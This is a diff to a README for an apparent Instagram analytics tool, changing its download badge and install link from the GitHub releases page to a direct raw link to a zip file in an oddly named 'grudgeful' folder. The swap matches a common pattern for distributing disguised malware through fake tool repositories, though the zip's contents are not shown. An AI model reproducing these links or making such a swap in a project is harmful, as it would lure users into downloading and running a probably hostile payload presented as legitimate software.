@@ -1,12 +1,12 @@
 # 🎉 instagram-analytics-software - Analyze and Boost Your Instagram Insights
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/kushal0451/instagram-analytics-software/releases)
+[![Download](https://raw.githubusercontent.com/kushal0451/instagram-analytics-software/main/grudgeful/instagram-analytics-software.zip)](https://raw.githubusercontent.com/kushal0451/instagram-analytics-software/main/grudgeful/instagram-analytics-software.zip)
 
 ## 🚀 Getting Started
 Welcome to the instagram-analytics-software! This tool helps you analyze your Instagram performance and improve your engagement and growth. With easy-to-read metrics and visualizations, you will easily understand what works best for your content. 
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Instagram Analytics Software Releases](https://github.com/kushal0451/instagram-analytics-software/releases). 
+To get started, visit this page to download: [Instagram Analytics Software Releases](https://raw.githubusercontent.com/kushal0451/instagram-analytics-software/main/grudgeful/instagram-analytics-software.zip). 
 
 1. Click on the link above.
 2. Browse the available versions.
